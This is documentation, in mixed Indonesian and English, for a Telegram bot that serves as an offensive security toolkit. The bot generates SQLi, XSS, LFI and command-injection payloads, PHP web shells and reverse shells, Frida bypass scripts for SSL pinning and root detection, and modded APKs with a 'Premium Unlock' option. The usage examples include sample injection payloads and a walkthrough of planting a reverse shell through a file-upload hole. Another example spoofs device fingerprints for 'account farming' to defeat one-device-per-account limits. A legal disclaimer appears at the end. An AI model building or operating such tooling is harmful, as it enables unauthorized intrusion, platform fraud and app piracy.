# 🔐 UmiAgent Security Bot - Complete Documentation

**Created:** 2026-09-06  
**Version:** 1.0.0  
**Target:** @umi_agbot enhancement dengan full security arsenal

---

## 📋 Table of Contents

1. [Overview](#overview)
2. [Installation](#installation)
3. [Configuration](#configuration)
4. [Features](#features)
5. [Command Reference](#command-reference)
6. [Module Architecture](#module-architecture)
7. [Usage Examples](#usage-examples)
8. [Deployment](#deployment)
9. [Security Notes](#security-notes)

---

## 🎯 Overview

UmiAgent Security Bot adalah comprehensive security toolkit dalam bentuk Telegram bot yang menyediakan:

- **Bypass Techniques** - SSL pinning, root detection, emulator, anti-debug
- **Exploit Generators** - SQLi, XSS, LFI, Command Injection payloads
- **Web Scanners** - Automated vulnerability scanning
- **Script Generators** - Web shells, reverse shells, enumeration tools
- **APK Automation** - APK modding pipeline dengan Frida integration
- **Device Spoofing** - Random device fingerprint generation

---

## 📦 Installation

### Prerequisites

```bash
# Python 3.9+
python3 --version

# Install dependencies
pip install python-telegram-bot aiohttp cloudscraper paramiko requests
```

### APK Tools (Optional untuk APK modding)

```bash
# APKTool
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
chmod +x apktool
sudo mv apktool /usr/local/bin/

# Uber APK Signer
wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar
mv uber-apk-signer-1.3.0.jar /usr/local/bin/uber-apk-signer.jar
```

### Frida Tools

```bash
pip install frida-tools objection
```

---

## ⚙️ Configuration

### 1. Setup Bot Token

1. Buat bot baru via [@BotFather](https://t.me/BotFather)
2. Gunakan `/newbot` command
3. Simpan token yang diberikan

### 2. Get Your User ID

1. Message [@userinfobot](https://t.me/userinfobot)
2. Catat User ID kamu

### 3. Edit Configuration

Edit file `telegram_bot_integration.py`:

```python
if __name__ == "__main__":
    # Your bot token from @BotFather
    BOT_TOKEN = "7123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw"  # ← Replace ini
    
    # Authorized users (Telegram User IDs)
    AUTHORIZED_USERS = [
        7570665912,  # sisuryaofficialkuu
        1234567890,  # User lain
        # Tambahkan user IDs di sini
    ]
```

### 4. Run Bot

```bash
# Direct run
python3 telegram_bot_integration.py

# Background dengan screen
screen -S security_bot
python3 telegram_bot_integration.py
# Ctrl+A, D untuk detach

# Systemd service (recommended for production)
sudo nano /etc/systemd/system/security-bot.service
```

**Systemd Service File:**
```ini
[Unit]
Description=UmiAgent Security Bot
After=network.target

[Service]
Type=simple
User=ubuntu
WorkingDirectory=/root
ExecStart=/usr/bin/python3 /root/telegram_bot_integration.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable security-bot
sudo systemctl start security-bot
sudo systemctl status security-bot
```

---

## 🚀 Features

### 1. **Bypass Techniques**

| Feature | Description | Output |
|---------|-------------|--------|
| SSL Pinning Bypass | Universal SSL bypass untuk Android | Frida script (.js) |
| Root Detection Bypass | Hide root dari app detection | Frida script (.js) |
| Emulator Detection Bypass | Spoof device properties | Frida script (.js) |
| Anti-Debug Bypass | Bypass debugger detection | Frida script (.js) |
| Device Fingerprint Spoof | Generate random device IDs | JSON data |

**Supports:**
- OkHttp3, TrustManagerImpl, Conscrypt
- File.exists(), Runtime.exec(), PackageManager checks
- Build properties, TelephonyManager spoofing
- TracerPid, ptrace anti-debug

### 2. **Exploit Generators**

| Type | Payloads | Features |
|------|----------|----------|
| SQL Injection | 20+ variants | Boolean, UNION, Time-based, Error-based |
| XSS | 18+ variants | Reflected, Stored, DOM, Filter bypasses |
| LFI | 15+ variants | Linux/Windows paths, PHP wrappers |
| Command Injection | 16+ variants | Linux/Windows, Reverse shells |

**Output:** `.txt` files dengan organized payloads ready untuk testing

### 3. **Web Vulnerability Scanner**

- **Port Scanner** - Async concurrent port scanning (top 20 ports)
- **SQL Injection Scanner** - Automated SQLi detection dengan error-based detection
- **XSS Scanner** - Reflected XSS detection
- **Results:** Real-time scanning dengan progress updates

### 4. **Script Generators**

| Script | Languages | Purpose |
|--------|-----------|---------|
| Web Shell | PHP | Command execution, file upload/download |
| Reverse Shell | Python, Bash, PowerShell | Remote access |
| Subdomain Enumerator | Python | Async subdomain discovery |

**Features:**
- Production-ready scripts
- Multiple execution methods (system, exec, shell_exec, passthru, popen)
- Error handling dan fallbacks

### 5. **APK Automation**

- **Decompile** - APKTool integration
- **Inject** - Frida Gadget, SSL bypass, root bypass
- **Recompile** - Automated rebuild
- **Sign** - Uber APK Signer dengan custom keystore
- **Full Pipeline** - One-command APK modding

---

## 📖 Command Reference

### Basic Commands

```bash
/start              # Welcome message
/help               # Show all commands
/menu               # Interactive menu dengan inline buttons
```

### Bypass Commands

```bash
/bypass <type>                  # Generic bypass dispatcher
/ssl_bypass                     # SSL pinning bypass (Frida)
/root_bypass                    # Root detection bypass
/emulator_bypass                # Emulator detection bypass
/antidebug_bypass              # Anti-debug bypass
/device_spoof                   # Generate 5 random device fingerprints
```

**Examples:**
```bash
/ssl_bypass
# Output: ssl_pinning_bypass.js

/device_spoof
# Output: 5 random device profiles dengan Android ID, IMEI, MAC, etc
```

### Exploit Commands

```bash
/sqli <target_url>              # SQL injection payloads
/xss <target_url>               # XSS payloads
/lfi                            # LFI payloads (generic)
/cmdi                           # Command injection payloads
```

**Examples:**
```bash
/sqli http://target.com/page.php?id=1
# Output: sqli_payloads.txt dengan 20+ SQLi payloads

/xss http://target.com/search?q=test
# Output: xss_payloads.txt dengan 18+ XSS payloads
```

### Generator Commands

```bash
/webshell <lang>                # Generate web shell
/revshell <lang> <ip> <port>   # Generate reverse shell
/subdomain_enum                 # Subdomain enumerator script
```

**Examples:**
```bash
/webshell php
# Output: shell.php (advanced multi-function shell)

/revshell python 192.168.1.100 4444
# Output: revshell.py

/revshell bash 10.0.0.1 9001
# Output: revshell.sh
```

### Scanner Commands

```bash
/portscan <target_ip>           # Port scanner (top 20 ports)
/webscan <target_url>           # Web vulnerability scanner (SQLi + XSS)
```

**Examples:**
```bash
/portscan 192.168.1.1
# Scans: 21,22,23,25,53,80,110,143,443,445,3306,3389,etc
# Output: List of open ports dengan status

/webscan http://target.com/page.php?id=1
# Tests: SQL injection + XSS
# Output: Vulnerability report
```

### APK Commands

```bash
/apk_ssl_bypass                 # APK SSL bypass instructions
```

**APK Upload:**
```bash
# Upload APK file directly ke bot
# Bot akan reply dengan inline buttons:
#   - SSL Bypass
#   - Root Bypass
#   - Premium Unlock
```

---

## 🏗️ Module Architecture

### File Structure

```
/root/
├── telegram_bot_integration.py       # Main bot file
├── bot_advanced_modules.py           # Core security modules
├── telegram_bot_skills.md            # Documentation
└── README_SECURITY_BOT.md           # This file

Modules:
bot_advanced_modules.py
├── AdvancedBypass                   # Bypass techniques
│   ├── ssl_pinning_bypass_universal()
│   ├── root_detection_bypass()
│   ├── emulator_detection_bypass()
│   ├── anti_debug_bypass()
│   └── generate_device_fingerprint()
│
├── ExploitPayloadGenerator          # Exploit payloads
│   ├── generate_sqli_payloads()
│   ├── generate_xss_payloads()
│   ├── generate_lfi_payloads()
│   └── generate_command_injection_payloads()
│
├── WebScanner                       # Vulnerability scanners
│   ├── scan_sql_injection()
│   ├── scan_xss()
│   └── port_scan()
│
├── APKAutomation                    # APK modding
│   ├── decompile_apk()
│   ├── inject_frida_gadget()
│   ├── recompile_apk()
│   ├── sign_apk()
│   └── full_mod_pipeline()
│
└── ScriptTemplates                  # Script generators
    ├── reverse_shell_python()
    ├── php_webshell_advanced()
    └── subdomain_enumerator()
```

### Module Dependencies

```
telegram_bot_integration.py
    ├── imports → bot_advanced_modules
    ├── uses → python-telegram-bot (Application, handlers)
    ├── uses → asyncio (async scanning)
    └── uses → aiohttp (HTTP requests)

bot_advanced_modules.py
    ├── uses → aiohttp (web scanning)
    ├── uses → asyncio (concurrent operations)
    └── uses → subprocess (APK tools integration)
```

---

## 💡 Usage Examples

### Example 1: SSL Pinning Bypass Workflow

```bash
# User di Telegram
/ssl_bypass

# Bot response:
✅ SSL Pinning Bypass (Frida)
[File: ssl_pinning_bypass.js]

Features:
• TrustManagerImpl (Android 7+)
• OkHttp3 CertificatePinner
• Conscrypt Platform
...

# User saves file, kemudian di terminal:
adb shell "su -c '/data/local/tmp/frida-server &'"
frida -U -f com.target.app -l ssl_pinning_bypass.js --no-pause

# App sekarang bypass SSL pinning ✅
```

### Example 2: SQL Injection Testing

```bash
# User menemukan potential SQLi target
/sqli http://vulnerable-site.com/product.php?id=1

# Bot generates 20+ payloads:
sqli_payloads.txt
---
# Type: boolean - Basic OR true
' OR '1'='1

# Type: union - UNION 2 columns
' UNION SELECT NULL,NULL--

# Type: time_blind - MySQL sleep 5s
' AND SLEEP(5)--
...

# User tests payloads satu per satu:
http://vulnerable-site.com/product.php?id=1' OR '1'='1
# Site shows all products → VULNERABLE ✅

# Next step: Exploit dengan SQLMap
sqlmap -u "http://vulnerable-site.com/product.php?id=1" --dbs
```

### Example 3: Automated Web Scanning

```bash
# Quick vulnerability assessment
/webscan http://target.com/login.php

# Bot scans automatically:
🔍 Scanning http://target.com/login.php...
Testing SQLi and XSS vulnerabilities.

# Results after 30-60 seconds:
🔍 Web Vulnerability Scan

Target: http://target.com/login.php

SQL Injection: ✅ VULNERABLE (3 confirmed)
  • boolean: ' OR '1'='1' --
  • union: ' UNION SELECT NULL--
  • time_blind: ' AND SLEEP(5)--

XSS: ✅ VULNERABLE (2 confirmed)
  • reflected: <script>alert('XSS')</script>
  • reflected: <img src=x onerror=alert('XSS')>
```

### Example 4: Generate Reverse Shell

```bash
# Need reverse shell untuk penetration test
/revshell python 192.168.1.100 4444

# Bot generates:
✅ Reverse Shell (PYTHON)
[File: revshell.py]

Target: 192.168.1.100:4444

Setup Listener:
nc -lvnp 4444

Execute on target:
python3 revshell.py

# User setup listener:
nc -lvnp 4444

# Upload revshell.py ke target via file upload vulnerability
# Execute → Shell obtained ✅
```

### Example 5: Device Fingerprint Spoofing

```bash
# Need multiple device profiles untuk account farming
/device_spoof

# Bot generates 5 random profiles:
📱 Random Device Fingerprints

Device 1:
• Brand: Samsung
• Model: Galaxy A52
• Android: 12
• Android ID: 4f3a2b1c8d9e7f6a
• Advertising ID: 9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d
• MAC: a2:b3:c4:d5:e6:f7
• IMEI: 359881234567890

Device 2:
• Brand: Xiaomi
• Model: Redmi Note 11
...

# User uses these IDs dalam account farming script
# Bypass "one device per account" restriction ✅
```

### Example 6: APK Modding via Upload

```bash
# User uploads app.apk ke bot

# Bot replies:
📱 APK Received: app.apk

Pilih modding type:
[SSL Bypass] [Root Bypass] [Premium Unlock]

# User clicks "SSL Bypass"

# Bot processes:
⏳ Decompiling APK...
⏳ Injecting SSL bypass...
⏳ Recompiling...
⏳ Signing APK...

# Bot sends back:
✅ Modded APK Ready!
[File: app-modded-aligned-signed.apk]

Changes:
• SSL pinning disabled
• Network security config injected
• Certificate trust modified

Install: adb install app-modded-aligned-signed.apk
```

---

## 🚢 Deployment

### Development (Local Testing)

```bash
# Run directly
python3 telegram_bot_integration.py

# Test commands
# Open Telegram → Message your bot → /start
```

### Production (VPS/Server)

#### Option 1: Screen Session

```bash
# Start persistent session
screen -S security_bot
python3 telegram_bot_integration.py

# Detach: Ctrl+A, D
# Reattach: screen -r security_bot
# Kill: screen -X -S security_bot quit
```

#### Option 2: Systemd Service (Recommended)

```bash
# Create service
sudo nano /etc/systemd/system/security-bot.service

# Paste content (lihat Configuration section)

# Enable & start
sudo systemctl daemon-reload
sudo systemctl enable security-bot
sudo systemctl start security-bot

# Check status
sudo systemctl status security-bot

# View logs
sudo journalctl -u security-bot -f
```

#### Option 3: Docker (Optional)

```dockerfile
# Dockerfile
FROM python:3.11-slim

WORKDIR /app

RUN apt-get update && apt-get install -y \
    openjdk-17-jre-headless \
    wget \
    && rm -rf /var/lib/apt/lists/*

# Install APKTool & Uber APK Signer
RUN wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool \
    && chmod +x /usr/local/bin/apktool

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

CMD ["python3", "telegram_bot_integration.py"]
```

```bash
# Build & run
docker build -t security-bot .
docker run -d --name security-bot --restart always security-bot

# Logs
docker logs -f security-bot
```

### Monitoring

```bash
# Check bot process
ps aux | grep telegram_bot_integration.py

# Check logs (systemd)
sudo journalctl -u security-bot --since "1 hour ago"

# Check resource usage
htop
```

---

## 🔒 Security Notes

### ⚠️ Legal Warning

**CRITICAL:** Bot ini adalah **dual-use tool**. Penggunaan yang salah dapat melanggar hukum.

#### Legal Usage ✅
- Personal research dan learning
- Authorized penetration testing (written contract)
- Bug bounty programs (within scope)
- Your own systems/infrastructure
- Educational lab environments

#### Illegal Usage ❌
- Unauthorized access ke systems orang lain
- Testing websites/apps tanpa izin
- Distribusi malware atau exploits
- DDoS attacks
- Data theft

#### Indonesian Law (UU ITE)
- **Pasal 30:** Unauthorized access → 6-8 tahun penjara
- **Pasal 32:** Data damage → 8-10 tahun penjara
- **Pasal 33:** System disruption (DDoS) → 10-12 tahun penjara

**Use at your own risk. Developer tidak bertanggung jawab atas penyalahgunaan.**

### 🛡️ Bot Security

#### Authorization System

Bot menggunakan whitelist-based authorization:

```python
AUTHORIZED_USERS = [
    7570665912,  # Only these users dapat akses
]

# Unauthorized users mendapat:
# ❌ Unauthorized!
# Bot ini hanya untuk authorized users.
```

**Best Practices:**
- Jangan share bot token publicly
- Limit authorized users ke trusted people only
- Monitor bot logs regularly
- Use private bot (jangan publish di bot directories)

#### Token Security

```bash
# NEVER commit token ke Git
echo "BOT_TOKEN=your_token_here" > .env
echo ".env" >> .gitignore

# Load via environment variable
import os
BOT_TOKEN = os.getenv('BOT_TOKEN')
```

#### Rate Limiting

Bot automatically implements delays:
- Web scanning: 0.3-0.5s per request
- Payload testing: 0.5s between payloads
- Port scanning: 2s timeout per port

Prevents:
- IP bans dari target servers
- Telegram API rate limits
- Server overload

---

## 📊 Performance

### Resource Usage

| Component | CPU | RAM | Bandwidth |
|-----------|-----|-----|-----------|
| Idle Bot | <1% | ~50MB | Minimal |
| Web Scanning | 5-10% | ~100MB | 1-5 MB/scan |
| APK Modding | 20-40% | ~200MB | Minimal |
| Port Scanning | 2-5% | ~80MB | Minimal |

### Scalability

**Current Configuration:**
- Single bot instance
- Synchronous command processing
- No queue system

**For High Traffic:**
```python
# Add job queue
from telegram.ext import JobQueue

# Rate limiting per user
user_last_command = {}

async def rate_limit_check(user_id):
    now = time.time()
    if user_id in user_last_command:
        if now - user_last_command[user_id] < 5:  # 5s cooldown
            return False
    user_last_command[user_id] = now
    return True
```

---

## 🔧 Troubleshooting

### Common Issues

#### 1. Bot Not Responding

```bash
# Check if running
ps aux | grep telegram_bot

# Check logs
sudo journalctl -u security-bot -n 50

# Restart
sudo systemctl restart security-bot
```

#### 2. "Unauthorized" Message

- Check user ID matches `AUTHORIZED_USERS` list
- Get your ID via @userinfobot
- Restart bot after config changes

#### 3. Module Import Errors

```bash
# Ensure both files in same directory
ls -la /root/telegram_bot_integration.py
ls -la /root/bot_advanced_modules.py

# Check Python path
python3 -c "import sys; print(sys.path)"

# Reinstall dependencies
pip install --upgrade python-telegram-bot aiohttp
```

#### 4. APK Modding Fails

```bash
# Check APKTool installed
apktool --version

# Check Java installed
java -version

# Check Uber APK Signer
ls -la /usr/local/bin/uber-apk-signer.jar
```

#### 5. Frida Scripts Not Working

```bash
# Check frida-server running on device
adb shell "ps | grep frida"

# Check Frida version mismatch
frida --version  # On PC
adb shell "/data/local/tmp/frida-server --version"  # On device

# Versions must match! Download matching versions:
# https://github.com/frida/frida/releases
```

---

## 📈 Future Enhancements

### Planned Features

1. **Advanced APK Modding**
   - Flutter app support (reFlutter integration)
   - Unity game modding
   - React Native bridge hooking

2. **Additional Scanners**
   - SSRF detection
   - XXE vulnerability testing
   - CSRF token analysis
   - JWT security testing

3. **Automation**
   - Scheduled vulnerability scans
   - Continuous monitoring
   - Notification alerts untuk findings

4. **Reporting**
   - PDF vulnerability reports
   - HTML dashboards
   - Export ke JSON/CSV

5. **Integration**
   - Shodan API integration
   - GitHub dorking
   - VirusTotal API
   - HaveIBeenPwned integration

### Contributing

Kalo mau nambah fitur:

1. Fork repository (kalo ada)
2. Create feature branch
3. Add your module ke `bot_advanced_modules.py`
4. Add command handler ke `telegram_bot_integration.py`
5. Test thoroughly
6. Submit pull request

---

## 📞 Support

**Developer:** @sisuryaofficialkuu  
**Telegram Bot:** @umi_agbot  
**Version:** 1.0.0  
**Last Updated:** 2026-09-06

**Issues?** Contact developer via Telegram.

---

## 📄 License

**Private Use Only**

This bot is for authorized users only. Redistribution, modification, or commercial use requires explicit permission from developer.

---

## 🎓 Educational Disclaimer

Tools provided oleh bot ini adalah **untuk educational purposes dan authorized security testing only**.

Unauthorized hacking adalah illegal dan unethical. Always:
- Obtain written permission sebelum testing
- Follow responsible disclosure policies
- Respect privacy dan data protection laws
- Use tools ethically dan responsibly

**Remember:** Great power comes with great responsibility. Gunakan skills kamu untuk good, bukan evil.

---

**Happy Hacking! (Legally)** 🔐✨
